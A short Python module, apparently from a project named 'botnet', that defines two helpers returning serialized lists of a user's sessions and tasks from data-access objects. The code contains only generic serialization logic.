from botnet.dao import session_dao, task_dao


def get_sessions_serialized(user_id):
	return [session.serialize() for session in session_dao.get_user_sessions(user_id)]


def get_tasks_serialized(user_id):
	return [task.serialize() for task in task_dao.get_user_tasks(user_id)]